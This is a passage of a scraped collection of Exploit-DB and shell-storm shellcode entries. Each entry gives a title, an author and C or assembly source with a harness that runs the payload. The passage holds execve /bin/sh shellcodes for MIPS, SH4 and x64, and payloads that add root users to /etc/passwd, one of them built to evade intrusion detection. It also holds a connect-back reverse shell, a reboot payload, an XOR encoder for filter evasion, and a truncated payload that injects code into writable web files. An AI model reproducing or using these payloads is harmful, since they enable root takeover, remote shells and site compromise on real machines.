\"\\x24\\x06\\x06\\x66\" /* li a2,1638           */", "    \"\\x04\\xd0\\xff\\xff\" /* bltzal a2,4100b4 <p> */", "    \"\\x28\\x06\\xff\\xff\" /* slti a2,zero,-1      */", "    \"\\x27\\xbd\\xff\\xe0\" /* addiu\tsp,sp,-32      */", "    \"\\x27\\xe4\\x10\\x01\" /* addiu\ta0,ra,4097     */", "    \"\\x24\\x84\\xf0\\x1f\" /* addiu\ta0,a0,-4065    */", "    \"\\xaf\\xa4\\xff\\xe8\" /* sw a0,-24(sp)        */", "    \"\\xaf\\xa0\\xff\\xec\" /* sw zero,-20(sp)      */", "    \"\\x27\\xa5\\xff\\xe8\" /* addiu\ta1,sp,-24      */", "    \"\\x24\\x02\\x0f\\xab\" /* li v0,4011           */", "    \"\\x01\\x01\\x01\\x0c\" /* syscall 0x40404      */", "    \"/bin/sh\"          /* sltiu\tv0,k1,26990    */", "                       /* sltiu\ts3,k1,26624    */", "};", "", "void ", "main(void) ", "{", "    void (*s)(void);", "    printf(\"sc size %d\\n\", sizeof(sc));", "    s = sc;", "    s();", "}"]},
{"Title": "Linux/MIPS - XOR Encoder Shellcode (60 bytes) (Generator)", "Author": "entropy", "Published": ": 2011-10-18", "Platform": "Generator", "Download": "https://old.exploit-db.com/download/17996.c", "View": "https://old.exploit-db.com/raw/17996/", "code": ["#include <fcntl.h>", "#include <stdio.h>", "#include <unistd.h>", "#include <sys/types.h>", "#include <sys/stat.h>", "#include <stdlib.h>", "#include <string.h>", "", "#define DEBUG 0", "", "/*", " * ", " * entropy [at] phiral.net ", " * mips (linux) shellcode xor encoder ", " *", " * \\xAB\\xCD is overwritten with jmp back offset", " * \\x00\\x00 is overwritten with the byte its xored with", " *", " * 0. gcc encoder.c -o encoder ", " * 1. perl -e 'print \"\\xsh\\xel\\xlc\\xod\\xe0\";' > sc.bin ", " * 2. ./encode", " *", " * can possibly get rid of \\x24\\x18\\xf9\\x9a to be -4", " *", " * sup busyboxen :o", " *", " */", "", "unsigned char encoder[] =", "\"\\x24\\x18\\xf9\\x9a\"  /* li $t8, -0x666                  */", "\"\\x07\\x10\\xff\\xff\"  /* p:  bltzal $t8, p               */", "\"\\x28\\x18\\xff\\xff\"  /* slti $t8, $zero, -1             */", "\"\\x27\\xe8\\x10\\x01\"  /* addu $t0, $ra, 4097             */", "\"\\x25\\x08\\xAB\\xCD\"  /* addu $t0, $t0, -4097+44+len+1   */", "\"\\x3c\\x09\\x00\\x00\"  /* lui $t1, 0xXXXX                 */", "\"\\x35\\x29\\x00\\x00\"  /* ori $t1, $t1, 0xXXXX            */", "\"\\x3c\\x0b\\x01\\xe0\"  /* lui $t3, 0x01e0                 */", "\"\\x35\\x6b\\x78\\x27\"  /* ori $t3, $t3, 0x7827            */", "\"\\x8d\\x0a\\xff\\xff\"  /* x:  lw $t2, -1($t0)             */ ", "\"\\x01\\x49\\x60\\x26\"  /* xor $t4, $t2, $t1               */", "\"\\xad\\x0c\\xff\\xff\"  /* sw $t4, -1($t0)                 */", "\"\\x25\\x08\\xff\\xfc\"  /* addu $t0, $t0, -4               */", "\"\\x15\\x4b\\xff\\xfb\"  /* bne $t2, $t3, -20               */", "\"\\x01\\xe0\\x78\\x27\"; /* nor $t7, $t7, $zero             */", "  ", "int ", "main(int argc, char **argv) {", "", "    struct stat sstat;", "    int a, i, n, fd, len, elen, xor_with;", "    unsigned char *fbuf, *ebuf;", "    unsigned char bad_bytes[256] = {0};", "    unsigned char good_bytes[256] = {0};", "", "    if (lstat(\"sc.bin\", &sstat) < 0) {", "        perror(\"lstat\");", "        _exit(-1);", "    }", "", "    len = sstat.st_size;", "    if ((fbuf = (unsigned char *)malloc(len)) == NULL) {", "        perror(\"malloc\");", "        _exit(-1);", "    }", "    ", "    if ((fd = open(\"sc.bin\", O_RDONLY)) < 0) {", "        perror(\"open\");", "        _exit(-1);", "    }", "", "    if (read(fd, fbuf, len) != len) {", "        perror(\"read\");", "        _exit(-1);", "    }", "", "    close(fd);", "", "    /* try every byte xored, if its \\x0 add to bad_bytes */", "    for (n = 0; n < len; n++) {", "        for (i = 1; i < 256; i++) {", "             if ((i^*(fbuf+n)) == 0) bad_bytes[i] = i;", "        }", "    }  ", "", "    /* if its not a bad_byte its a good_one (ordered) */", "    for (i = 1, n = 0; i < 256; i++) {", "        if (bad_bytes[i] == '\\0') good_bytes[n++] = i;", "    }", "    ", "    srand((unsigned)time(NULL));  ", "    xor_with = good_bytes[rand()%n];", "", "    if (xor_with) {", "        printf(\"\\n[x] Choose to XOR with 0x%02x\\n\\n\", xor_with);", "         ", "        /* overwrite bytes 18, 19 with subtract addr */", "        /* 44 bytes to jmp past our asm + sc len + 1 */", "        a = -4097 + 44 + len + 1;", "        encoder[18] = (char)(((int)a) >> 8);", "        encoder[19] = (char)a;", "", "        /* overwrite bytes 22, 23, 26, 27 of encoder */", "        encoder[22] = xor_with;", "        encoder[23] = xor_with;", "        encoder[26] = xor_with;", "        encoder[27] = xor_with;", "", "        elen = strlen((char *)encoder);", "", "        if ((ebuf = (unsigned char *)malloc(elen+len+1)) == NULL) {", "            perror(\"malloc\");", "            _exit(-1);", "        }", "", "        memset(ebuf, '\\x0', sizeof(ebuf));", "        memcpy(ebuf, encoder, sizeof(encoder));", "", "        for (i = 0; i < len; i++) {", "            ebuf[(i+elen)]  = xor_with^*(fbuf+i);", "        }", "", "        printf(\"[S] Shellcode: \\n\\\"\"); ", "        for (i = 0; i < strlen((char *)ebuf); i++) {", "            if (i > 0 && i % 4 == 0) printf(\"\\\"\\n\\\"\"); ", "            printf(\"\\\\x%02x\", ebuf[i]);", "        }", "        printf(\"\\\"\\n\\n\");", "", "    } else {", "        printf(\"[*] No byte found to XOR with :(\\n\");", "        _exit(-1);", "    }", "", "    return 0;", "}"]},
{"Title": "Linux/SuperH (sh4) - setuid(0) + execve(\"/bin/sh\", NULL, NULL) Shellcode (27 bytes)", "Author": "Jonathan Salwan", "Published": ": 2011-11-24", "Platform": "SuperH_SH4", "Download": "http://shell-storm.org/shellcode/files/shellcode-787.php", "View": null, "code": ["/*", "  Linux/SuperH - sh4 - setuid(0) ; execve(\"/bin/sh\", NULL, NULL) - 27 bytes", "  Tested on debian-sh4 2.6.32-5-sh7751r", "  by Jonathan Salwan - twitter: @jonathansalwan", "", "  400054:        17 e3      mov      #23,r3", "  400056:        4a 24      xor      r4,r4", "  400058:        0b c3      trapa    #11", "  40005a:        3a 23      xor      r3,r3", "  40005c:        0b e3      mov      #11,r3", "  40005e:        02 c7      mova     400068 <__bss_start-0x10008>,r0", "  400060:        03 64      mov      r0,r4", "  400062:        5a 25      xor      r5,r5", "  400064:        6a 26      xor      r6,r6", "  400066:        0b c3      trapa    #11", "  400068:        2f 62      exts.w   r2,r2", "  40006a:        69 6e      swap.w   r6,r14", "  40006c:        2f 73      add      #47,r3", "  40006e:        68 00      .word 0x0068", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "char *SC = \"\\x17\\xe3\\x4e\\x24\"", "           \"\\x0b\\xc3\\x3a\\x23\"", "           \"\\x0b\\xe3\\x02\\xc7\"", "           \"\\x03\\x64\\x5a\\x25\"", "           \"\\x6a\\x26\\x0b\\xc3\"", "           \"\\x2f\\x62\\x69\\x6e\"", "           \"\\x2f\\x73\\x68\"; ", "", "void main(void)", "{", "  fprintf(stdout, \"Length: %d\\n\", strlen(SC));", "  (*(void(*)()) SC)();", "}"]},
{"Title": "Linux/MIPS - execve(/bin/sh) Shellcode (48 bytes)", "Author": "rigan", "Published": ": 2011-11-27", "Platform": "Linux_MIPS", "Download": "http://shell-storm.org/shellcode/files/shellcode-792.php", "View": null, "code": ["/* Title:  Linux/MIPS - execve /bin/sh - 48 bytes", "   Date:   2011-11-24", "   Author: rigan - imrigan [at] gmail.com", "   ", "        .text", "        .global __start", "__start:", "        slti $a2, $zero, -1", "        li $t7, 0x2f2f6269", "        sw $t7, -12($sp)", "        li $t6, 0x6e2f7368", "        sw $t6, -8($sp)", "        sw $zero, -4($sp)", "        la $a0, -12($sp)", "        slti $a1, $zero, -1", "        li $v0, 4011", "        syscall 0x40404", "*/", "", "#include <stdio.h>", "", "", "char sc[] = { ", "        \"\\x28\\x06\\xff\\xff\"        /* slti    a2,zero,-1   */", "        \"\\x3c\\x0f\\x2f\\x2f\"        /* lui     t7,0x2f2f    */", "        \"\\x35\\xef\\x62\\x69\"        /* ori     t7,t7,0x6269 */", "        \"\\xaf\\xaf\\xff\\xf4\"        /* sw      t7,-12(sp)   */", "        \"\\x3c\\x0e\\x6e\\x2f\"        /* lui     t6,0x6e2f    */", "        \"\\x35\\xce\\x73\\x68\"        /* ori     t6,t6,0x7368 */", "        \"\\xaf\\xae\\xff\\xf8\"        /* sw      t6,-8(sp)    */", "        \"\\xaf\\xa0\\xff\\xfc\"        /* sw      zero,-4(sp)  */", "        \"\\x27\\xa4\\xff\\xf4\"        /* addiu   a0,sp,-12    */", "        \"\\x28\\x05\\xff\\xff\"        /* slti    a1,zero,-1   */", "        \"\\x24\\x02\\x0f\\xab\"        /* li      v0,4011      */", "        \"\\x01\\x01\\x01\\x0c\"        /* syscall 0x40404      */", "};", "", "void main(void)", "{", "       void(*s)(void);", "       printf(\"size: %d\\n\", strlen(sc));", "       s = sc;", "       s();", "}"]},
{"Title": "Linux/MIPS - Add Root User (rOOt/pwn3d) To /etc/passwd Shellcode (164 bytes)", "Author": "rigan", "Published": ": 2011-11-27", "Platform": "Linux_MIPS", "Download": "http://shell-storm.org/shellcode/files/shellcode-793.php", "View": null, "code": ["/* Title:  Linux/MIPS -add user(UID 0) with password - 164 bytes", " * Date:   2011-11-24", " * Author: rigan - imrigan [at] gmail.com", " * Note:", " *         Username - rOOt", " *         Password - pwn3d", " */", "", "#include <stdio.h>", "", "char sc[] = ", "        \"\\x24\\x09\\x73\\x50\"       //  li      t1,29520", "        \"\\x05\\x30\\xff\\xff\"       //  bltzal  t1,400094 <L>", "        \"\\x24\\x09\\x73\\x50\"       //  li      t1,29520 (nop)", "\t", "     /* open(\"/etc/passwd\", O_WRONLY|O_CREAT|O_APPEND); */", "        \"\\x3c\\x0f\\x30\\x2f\"       //  lui     t7,0x302f ", "        \"\\x35\\xef\\x65\\x74\"       //  ori     t7,t7,0x6574", "        \"\\x3c\\x0e\\x63\\x2f\"       //  lui     t6,0x632f    ", "        \"\\x35\\xce\\x70\\x61\"       //  ori     t6,t6,0x7061", "        \"\\x3c\\x0d\\x73\\x73\"       //  lui     t5,0x7373", "        \"\\x35\\xad\\x77\\x64\"       //  ori     t5,t5,0x7764", "        \"\\xaf\\xaf\\xff\\xf3\"       //  sw      t7,-13(sp)", "\t\"\\xaf\\xae\\xff\\xf7\"       //  sw      t6,-9(sp)", "\t\"\\xaf\\xad\\xff\\xfb\"       //  sw      t5,-5(sp)", "        \"\\xaf\\xa0\\xff\\xff\"       //  sw      zero,-1(sp)", "\t\"\\x27\\xa4\\xff\\xf4\"       //  addiu   a0,sp,-12", "        \"\\x24\\x05\\x01\\x6d\"       //  li      a1,365", "        \"\\x24\\x02\\x0f\\xa5\"       //  li      v0,4005", "        \"\\x01\\x01\\x01\\x0c\"       //  syscall 0x40404", "", "\t\"\\xaf\\xa2\\xff\\xfc\"       //  sw      v0,-4(sp)", "\t", "     /* write(fd, \"rOOt:XJ1GV.nyFFMoI:0:0:root:/root:/bin/bash\\n\", 45);\t*/", "        \"\\x8f\\xa4\\xff\\xfc\"       //  lw      a0,-4(sp)", "        \"\\x23\\xe5\\x10\\x0c\"       //  addi    a1,ra,4108", "        \"\\x20\\xa5\\xf0\\x60\"       //  addi    a1,a1,-4000", "        \"\\x24\\x09\\xff\\xd3\"       //  li      t1,-45", "        \"\\x01\\x20\\x30\\x27\"       //  nor     a2,t1,zero", "        \"\\x24\\x02\\x0f\\xa4\"       //  li      v0,4004", "        \"\\x01\\x01\\x01\\x0c\"       //  syscall 0x40404", "        ", "      /* close(fd); */", "        \"\\x24\\x02\\x0f\\xa6\"       //  li      v0,4006", "        \"\\x01\\x01\\x01\\x0c\"       //  syscall 0x40404", "\t", "      /* exit(0);  */", "       \"\\x28\\x04\\xff\\xff\"        //  slti    a0,zero,-1", "       \"\\x24\\x02\\x0f\\xa1\"        //  li      v0,4001", "       \"\\x01\\x01\\x01\\x0c\"        //  syscall 0x40404", "     ", "      /*  \"rOOt:XJ1GV.nyFFMoI:0:0:root:/root:/bin/bash\\n\" */", "       \"\\x72\\x4f\\x4f\\x74\"        ", "       \"\\x3a\\x58\\x4a\\x31\"        ", "       \"\\x47\\x56\\x2e\\x6e\"        ", "       \"\\x79\\x46\\x46\\x4d\"        ", "       \"\\x6f\\x49\\x3a\\x30\"        ", "       \"\\x3a\\x30\\x3a\\x72\"        ", "       \"\\x6f\\x6f\\x74\\x3a\"        ", "       \"\\x2f\\x72\\x6f\\x6f\"       ", "       \"\\x74\\x3a\\x2f\\x62\"       ", "       \"\\x69\\x6e\\x2f\\x62\"        ", "       \"\\x61\\x73\\x68\\x0a\";        ", "      ", "void main(void)", "{", "       void(*s)(void);", "       printf(\"size: %d\\n\", strlen(sc));", "       s = sc;", "       s();", "}"]},
{"Title": "Linux/x64 - execve(/bin/sh) Shellcode (52 bytes)", "Author": "X-h4ck", "Published": ": 2011-12-03", "Platform": "Linux_x86-64", "Download": "https://old.exploit-db.com/download/18197.c", "View": "https://old.exploit-db.com/raw/18197/", "code": ["/*", "", "Exploit Title : linux/x86-64 execve(/bin/sh) 52 bytes", "Tested on     : Linux iron 2.6.38-8-generic #42-Ubuntu SMP Mon Apr 11 03:31:24 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux", "Date          : 03/12/2011", "Author        : X-h4ck", "Email         : mem001@live.com", "Website       : http://www.pirate.al", "Greetz        : mywisdom - Danzel - Wulns~ - IllyrianWarrior- Ace - M4yh3m - Saldeath ", "                ev1lut1on - bi0 - Slimshaddy - d3trimentaL - Lekosta ", "                CR - Hack-Down - H3ll - Pretorian - d4nte_sA ", "", "*/", "", "", "char SC[] =   \"\\xeb\\x1d\\x5b\\x31\\xc0\\x67\\x89\\x43\\x07\\x67\\x89\\x5b\\x08\\x67\\x89\\x43\\x0c\"\\", "              \"\\x31\\xc0\\xb0\\x0b\\x67\\x8d\\x4b\\x08\\x67\\x8d\\x53\\x0c\\xcd\\x80\\xe8\\xde\\xff\"\\", "              \"\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x4e\\x41\\x41\\x41\\x41\\x42\\x42\\x42\"\\", "              \"\\x42\";", "", "int", "main (int argc, char **argv)", "{", "        int (*ret)();              ", "        ret = (int(*)())SC; ", "                                   ", "        (int)(*ret)();             ", "        exit(0);                   ", "}"]},
{"Title": "Linux/MIPS - Reverse (0x7a69/TCP) Shell Shellcode (168 bytes)", "Author": "rigan", "Published": ": 2011-12-10", "Platform": "Linux_MIPS", "Download": "http://shell-storm.org/shellcode/files/shellcode-794.php", "View": null, "code": ["/*", " * Title: Linux/MIPS - connect back shellcode (port 0x7a69) - 168 bytes.", " * Author: rigan - imrigan [sobachka] gmail.com", " */", "", "#include <stdio.h>", "", "char sc[] =", "         \"\\x24\\x0f\\xff\\xfd\"        // li      t7,-3", "         \"\\x01\\xe0\\x20\\x27\"        // nor     a0,t7,zero", "         \"\\x01\\xe0\\x28\\x27\"        // nor     a1,t7,zero", "         \"\\x28\\x06\\xff\\xff\"        // slti    a2,zero,-1", "         \"\\x24\\x02\\x10\\x57\"        // li      v0,4183 ( sys_socket )", "         \"\\x01\\x01\\x01\\x0c\"        // syscall 0x40404", "\t ", "         \"\\xaf\\xa2\\xff\\xff\"        // sw      v0,-1(sp)", "         \"\\x8f\\xa4\\xff\\xff\"        // lw      a0,-1(sp)", "         \"\\x24\\x0f\\xff\\xfd\"        // li      t7,-3 ( sa_family = AF_INET )", "         \"\\x01\\xe0\\x78\\x27\"        // nor     t7,t7,zero", "         \"\\xaf\\xaf\\xff\\xe0\"        // sw      t7,-32(sp) ", "         \"\\x3c\\x0e\\x7a\\x69\"        // lui     t6,0x7a69 ( sin_port = 0x7a69 )", "         \"\\x35\\xce\\x7a\\x69\"        // ori     t6,t6,0x7a69", "         \"\\xaf\\xae\\xff\\xe4\"        // sw      t6,-28(sp)", "         ", "      /* ====================  You can change ip here ;) ====================== */", "         \"\\x3c\\x0d\\xc0\\xa8\"        // lui     t5,0xc0a8 ( sin_addr = 0xc0a8 ... ", "         \"\\x35\\xad\\x01\\x64\"        // ori     t5,t5,0x164           ...0164 )", "      /* ====================================================================== */", "      ", "         \"\\xaf\\xad\\xff\\xe6\"        // sw      t5,-26(sp)", "         \"\\x23\\xa5\\xff\\xe2\"        // addi    a1,sp,-30", "         \"\\x24\\x0c\\xff\\xef\"        // li      t4,-17 ( addrlen = 16 )     ", "         \"\\x01\\x80\\x30\\x27\"        // nor     a2,t4,zero ", "         \"\\x24\\x02\\x10\\x4a\"        // li      v0,4170 ( sys_connect ) ", "         \"\\x01\\x01\\x01\\x0c\"        // syscall 0x40404", "\t ", "         \"\\x24\\x0f\\xff\\xfd\"        // li      t7,-3", "         \"\\x01\\xe0\\x28\\x27\"        // nor     a1,t7,zero", "         \"\\x8f\\xa4\\xff\\xff\"        // lw      a0,-1(sp)", "//dup2_loop:", "         \"\\x24\\x02\\x0f\\xdf\"        // li      v0,4063 ( sys_dup2 )", "         \"\\x01\\x01\\x01\\x0c\"        // syscall 0x40404", "         \"\\x20\\xa5\\xff\\xff\"        // addi    a1,a1,-1", "         \"\\x24\\x01\\xff\\xff\"        // li      at,-1", "         \"\\x14\\xa1\\xff\\xfb\"        // bne     a1,at, dup2_loop", "\t ", "         \"\\x28\\x06\\xff\\xff\"        // slti    a2,zero,-1", "         \"\\x3c\\x0f\\x2f\\x2f\"        // lui     t7,0x2f2f", "         \"\\x35\\xef\\x62\\x69\"        // ori     t7,t7,0x6269", "         \"\\xaf\\xaf\\xff\\xf4\"        // sw      t7,-12(sp)", "         \"\\x3c\\x0e\\x6e\\x2f\"        // lui     t6,0x6e2f", "         \"\\x35\\xce\\x73\\x68\"        // ori     t6,t6,0x7368", "         \"\\xaf\\xae\\xff\\xf8\"        // sw      t6,-8(sp)", "         \"\\xaf\\xa0\\xff\\xfc\"        // sw      zero,-4(sp)", "         \"\\x27\\xa4\\xff\\xf4\"        // addiu   a0,sp,-12", "         \"\\x28\\x05\\xff\\xff\"        // slti    a1,zero,-1", "         \"\\x24\\x02\\x0f\\xab\"        // li      v0,4011 ( sys_execve )", "         \"\\x01\\x01\\x01\\x0c\";       // syscall 0x40404", "         ", "void main(void)", "{", "       ", "       void(*s)(void);", "       printf(\"size: %d\\n\", sizeof(sc));", "       s = sc;", "       s();", "}"]},
{"Title": "Linux/MIPS - reboot() Shellcode (32 bytes)", "Author": "rigan", "Published": ": 2011-12-10", "Platform": "Linux_MIPS", "Download": "http://shell-storm.org/shellcode/files/shellcode-795.php", "View": null, "code": ["/*", " * Title: Linux/MIPS - reboot() - 32 bytes.", " * Author: rigan - imrigan [sobachka] gmail.com", " */", "", "#include <stdio.h>", "", "char sc[] =          ", "         \"\\x3c\\x06\\x43\\x21\"       // lui     a2,0x4321", "         \"\\x34\\xc6\\xfe\\xdc\"       // ori     a2,a2,0xfedc", "         \"\\x3c\\x05\\x28\\x12\"       // lui     a1,0x2812", "         \"\\x34\\xa5\\x19\\x69\"       // ori     a1,a1,0x1969", "         \"\\x3c\\x04\\xfe\\xe1\"       // lui     a0,0xfee1", "         \"\\x34\\x84\\xde\\xad\"       // ori     a0,a0,0xdead", "         \"\\x24\\x02\\x0f\\xf8\"       // li      v0,4088", "         \"\\x01\\x01\\x01\\x0c\";      // syscall 0x40404 ", "", "void main(void)", "{", "       void(*s)(void);", "       printf(\"size: %d\\n\", sizeof(sc));", "       s = sc;", "       s();", "}"]},
{"Title": "Linux/x86 - setuid(0) + setgid(0) + Add Root User (iph) To /etc/passwd + No Password + Polymorphic Shellcode", "Author": "pentesters.ir", "Published": ": 2011-12-31", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-798.php", "View": null, "code": ["/*", "# Exploit Title: Linux/x86 Polymorphic ShellCode - setuid(0)+setgid(0)+add user 'iph' without password to /etc/passwd", "# setuid() - setgid() - open() - write() - close() - exit()", "# Date: 30/12/2011", "# Author: pentesters.ir", "# Tested on: Linux x86 - CentOS 6.0 - 2.6.32-71", "# Website: http://pentesters.ir/", "# Contact: Cru3l.b0y@gmail.com", "# By: Cru3l.b0y", "# iph::0:0:IPH:/root:/bin/bash", "# This ShellCode is Anti-IDS", "# Encode: ADD 10", "", "\"\\xb0\\x17\"                  \t// mov    $0x17,%al", "\"\\x31\\xdb\"                  \t// xor    %ebx,%ebx", "\"\\xcd\\x80\"                  \t// int    $0x80", "\"\\xb0\\x2e\"                  \t// mov    $0x2e,%al", "\"\\x53\"                      \t// push   %ebx", "\"\\xcd\\x80\"                  \t// int    $0x80", "\"\\x6a\\x05\"                   \t// push   $0x5", "\"\\x58\"                   \t    // pop    %eax", "\"\\x31\\xc9\"                \t    // xor    %ecx,%ecx", "\"\\x51\"                   \t    // push   %ecx", "\"\\x68\\x73\\x73\\x77\\x64\"       \t// push   $0x64777373", "\"\\x68\\x2f\\x2f\\x70\\x61\"       \t// push   $0x61702f2f", "\"\\x68\\x2f\\x65\\x74\\x63\"       \t// push   $0x6374652f", "\"\\x89\\xe3\"                \t    // mov    %esp,%ebx", "\"\\x66\\xb9\\x01\\x04\"          \t// mov    $0x401,%cx", "\"\\xcd\\x80\"                  \t// int    $0x80", "\"\\x89\\xc3\"                  \t// mov    %eax,%ebx", "\"\\x6a\\x04\"                  \t// push   $0x4", "\"\\x58\"                      \t// pop    %eax", "\"\\x31\\xd2\"                  \t// xor    %edx,%edx", "\"\\x52\"                      \t// push   %edx", "\"\\x68\\x62\\x61\\x73\\x68\"       \t// push   $0x68736162", "\"\\x68\\x62\\x69\\x6e\\x2f\"       \t// push   $0x2f6e6962", "\"\\x68\\x6f\\x74\\x3a\\x2f\"       \t// push   $0x2f3a746f", "\"\\x68\\x3a\\x2f\\x72\\x6f\"       \t// push   $0x6f722f3a", "\"\\x68\\x3a\\x49\\x50\\x48\"       \t// push   $0x4850493a", "\"\\x68\\x3a\\x30\\x3a\\x30\"       \t// push   $0x303a303a", "\"\\x68\\x69\\x70\\x68\\x3a\"       \t// push   $0x3a687069", "\"\\x89\\xe1\"               \t    // mov    %esp,%ecx", "\"\\x6a\\x1c\"                  \t// push   $0x1c", "\"\\x5a\"                      \t// pop    %edx", "\"\\xcd\\x80\"                  \t// int    $0x80", "\"\\x6a\\x06\"                   \t// push   $0x6", "\"\\x58\"                      \t// pop    %eax", "\"\\xcd\\x80\"                   \t// int    $0x80", "\"\\x6a\\x01\"                  \t// push   $0x1", "\"\\x58\"                      \t// pop    %eax", "\"\\xcd\\x80\"                \t    // int    $0x80", "*/", "", "// ##### ANTI IDS SHELLCODE #####", "", "#include <stdio.h>", "#include <stdlib.h>", "#include <string.h>", "", "char sc[] =", "\"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x64\\x80\\x6c\\x0e\\xff\\x0a\\x80\\xe9\"", "\"\\x01\\x75\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff\\xba\\x21\\x3b\\xe5\"", "\"\\xd7\\x8a\\xba\\x38\\x5d\\xd7\\x8a\\x74\\x0f\\x62\\x3b\\xd3\\x5b\\x72\"", "\"\\x7d\\x7d\\x81\\x6e\\x72\\x39\\x39\\x7a\\x6b\\x72\\x39\\x6f\\x7e\\x6d\"", "\"\\x93\\xed\\x70\\xc3\\x0b\\x0e\\xd7\\x8a\\x93\\xcd\\x74\\x0e\\x62\\x3b\"", "\"\\xdc\\x5c\\x72\\x6c\\x6b\\x7d\\x72\\x72\\x6c\\x73\\x78\\x39\\x72\\x79\"", "\"\\x7e\\x44\\x39\\x72\\x44\\x39\\x7c\\x79\\x72\\x44\\x53\\x5a\\x52\\x72\"", "\"\\x44\\x3a\\x44\\x3a\\x72\\x73\\x7a\\x72\\x44\\x93\\xeb\\x74\\x26\\x64\"", "\"\\xd7\\x8a\\x74\\x10\\x62\\xd7\\x8a\\x74\\x0b\\x62\\xd7\\x8a\";", "", "int main()", "{", "\tint (*fp)() = (int(*)())sc;", "    \tprintf(\"bytes: %u\\n\", strlen(sc));", "    \tfp();", "}"]},
{"Title": "Linux/x86 - Search For '.PHP'/'.HTML' Writable Files + Add Code Shellcode (380+ bytes)", "Author": "rigan", "Published": ": 2012-01-17", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-799.php", "View": null, "code": ["; Title : Linux/x86 Search php,html writable files and add your code.", "; Date  : 2011-10-24 ", "; Author: rigan - imrigan [sobachka ] gmail.com", "; Size  : 380 bytes + your code.", ";", "; Note  : This shellcode writes down your code in the end of ", ";         found files. Your code will be added only .html and .php ", ";         files. Search for files is carried out recursively.  ", "", " ", "", "BITS 32", "", "section .text", "global _start", "_start:", ";======================================================================;", ";                               main                                   ;", ";======================================================================;", "              ; chdir(\"/\")  ", "                xor eax, eax", "                push eax", "                sub esp, BYTE 0x1", "                mov BYTE [esp], 0x2f", "                mov ebx, esp", "                mov al, 12", "                int 0x80", "            ", "                xor eax, eax", "                push eax", "                sub esp, BYTE 0x1", "                mov BYTE [esp], 0x2e", "               ", "                jmp SHORT .exit", "", ".jmp_search: ", "                jmp SHORT search      ", "", ".exit:", "                call .jmp_search", "         ", "              ; exit(0)   ", "                xor eax, eax", "                xor ebx, ebx", "                mov al, 1", "                int 0x80", "", ";======================================================================;", ";                               inject                                 ;", ";======================================================================;", "inject:", "               ; open(\"file\", O_WRONLY)", "                xor eax, eax", "                mov ebx, edi", "                xor ecx, ecx", "                mov cl, 2", "                mov al, 5", "                int 0x80", "                                               ", "              ; lseek(fd, 0, SEEK_END)", "                xor ebx, ebx", "                mov ebx, eax", "                xor ecx, ecx", "                xor eax, eax", "                cdq", "                mov dl, 2", "                mov al, 19", "                int 0x80", "    ", "              ; write(fd, your_code, sizeof(your_code))  ", "                xor eax, eax", "                mov ecx, esi", "                mov dl, 43   ; <- TO CHANGE THE SIZE HERE.", "                mov al, 4", "                int 0x80 ", "", "              ; close(fd)", "                xor eax, eax", "                xor ebx, ebx", "                mov al, 6", "                int 0x80 ", "              ", "                ret", "                ", ";======================================================================;", ";                               substr                                 ;", ";======================================================================;", "        ", "substr:       ", "                xor eax, eax", "                xor ebx, ebx", "                xor ecx, ecx", "                cdq", "", "loop_1: ", "                inc edx", "                ", "              ; edi contains the filename address", "              ; esi contains the substring address ", "                mov BYTE bl, [edi + edx] ", "        ", "                test bl, bl ", "                jz not_found", "                ", "                cmp BYTE bl, [esi]        ", "                jne loop_1        ", "", "loop_2:        ", "                mov BYTE al, [esi + ecx]", "                mov BYTE bl, [edi + edx]", "        ", "                test al, al", "                jz found", "        ", "                inc ecx", "        ", "                inc edx", "                cmp bl, al", "       ", "                je loop_2", "        ", "                jmp short not_found", "", "found:", "                xor eax, eax", "                mov al, 2", "        ", "not_found:", "               ", "                ret", "                ", ";======================================================================;", ";                               search                                 ;", ";======================================================================;", ";This function recursively find all writable files. [php, html]", "search:", "                push ebp", "                mov ebp, esp", "                ", "                ", "                mov al, 250", "                sub esp, eax", "               ", "              ; open(\".\", O_WRONLY)", "                xor eax, eax", "                xor ecx, ecx", "                lea ebx, [ebp + 8]", "                mov al, 5", "                int 0x80", "         ", "                test eax, eax", "                js .old_dirent", "      ", "                mov [ebp + 12], eax    ", "", ".while:", "              ; readdir(fd, struct old_linux_dirent *dirp, NULL)", "                mov esi, [ebp + 12]", "                mov ebx, esi", "                xor eax, eax", "                xor ecx, ecx", "                lea ecx, [esp + 100]", "                mov al, 89", "                int 0x80", "         ", "                test eax, eax", "                jnz .l1", "", "              ; closedir(fd)", "                xor eax, eax", "                xor ebx, ebx", "                mov ebx, esi", "                mov al, 6", "                int 0x80", "", ".old_dirent:         ", "              ; chdir(\"..\")", "                xor eax, eax", "                push eax", "                push WORD 0x2e2e", "                mov ebx, esp", "                mov al, 12", "                int 0x80", "", "                leave ", "                ret", "", ".l1:", "                lea edx, [esp + 110]", "                ", "                cmp DWORD [edx], 0x636f7270   ; If the /proc filesystem detected...", "                je .while                     ; ...next dir", "         ", "                cmp BYTE [edx], 0x2e", "                jne .l2", "                ", "                jmp  .while", "", ".l2:", "              ; lstat(const char *file, struct stat *buf)", "                mov ebx, edx", "                mov ecx, esp", "                xor eax, eax", "                mov al, 196", "                int 0x80 ", "         ", "                mov cx, 61439", "                mov bx, 40959", "                inc ecx   ", "                inc ebx", "                mov eax, [esp + 16]", "         ", "                and ax, cx", "         ", "                cmp ax, bx", "                jne .l3", "                ", "                jmp .while", "", ".l3:", "                xor eax, eax", "                push eax", "                sub esp, BYTE 0x1", "                mov BYTE [esp], 0x2e", "         ", "              ; chdir(\"file\")", "                mov ebx, edx", "                mov al, 12", "                int 0x80", "         ", "                test eax, eax", "                jne .l4", "         ", "                call search", "                ", "                jmp .while", "", ".l4:   ", "              ; access(\"file\", W_OK)       ", "                xor eax, eax", "                mov ebx, edx", "                xor ecx, ecx", "                mov cl, 2", "                mov al, 33", "                int 0x80", "         ", "       ", "                test eax, eax", "                jz .check_html", "                ", "                jmp .while", "", ";======================================================================;", ";                               check_html                             ;", ";======================================================================;", ".check_html:", "                xor eax, eax", "                push eax", "                push DWORD 0x6c6d7468   ; ", "                sub esp, BYTE 0x1       ; .html", "                mov BYTE [esp], 0x2e    ;  ", "                ", "                mov esi, esp         ", "                mov edi, edx         ", "                call substr", "         ", "                cmp BYTE al, 2", "                je .do_inject", "", ";======================================================================;", ";                               check_php                              